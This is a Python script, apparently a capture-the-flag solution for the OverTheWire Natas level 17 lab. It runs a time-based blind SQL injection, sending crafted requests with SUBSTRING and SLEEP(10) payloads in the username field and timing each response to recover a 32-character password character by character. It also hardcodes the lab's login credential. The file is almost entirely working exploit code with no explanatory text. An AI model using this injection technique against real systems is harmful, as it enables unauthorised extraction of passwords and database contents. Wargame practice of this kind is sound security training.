#!/usr/bin/python

__author__ = "bt3"

import requests
import string


def brute_force_password(LENGTH, AUTH, CHARS, SQL_URL1, SQL_URL2):

        password = ''

        for i in range(1, LENGTH+1):
            for j in range (len(CHARS)):
                r = requests.get( ( SQL_URL1 + str(i) + SQL_URL2 + CHARS[j] + SQL_URL3 ), auth=AUTH)
                time =  r.elapsed.total_seconds()

                print("Position %d: trying %s... Time: %.3f" %(i, CHARS[j], time))
                #print r.url
                if time >= 9:
                    password += CHARS[j]
                    print("Password so far: " + password)
                    break

        return password



if __name__ == '__main__':

        # authorization: login and password
        AUTH = ('natas17', '8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw')


        # BASE64 password and 32 bytes
        CHARS = string.ascii_letters + string.digits
        LENGTH = 32

        # crafted url option 1
        SQL_URL1 = 'http://natas17.natas.labs.overthewire.org?username=natas18" AND SUBSTRING(password,'
        SQL_URL2 = ',1) LIKE BINARY "'
        SQL_URL3 = '" AND SLEEP(10) AND "1"="1'

        print(brute_force_password(LENGTH, AUTH, CHARS, SQL_URL1, SQL_URL2))

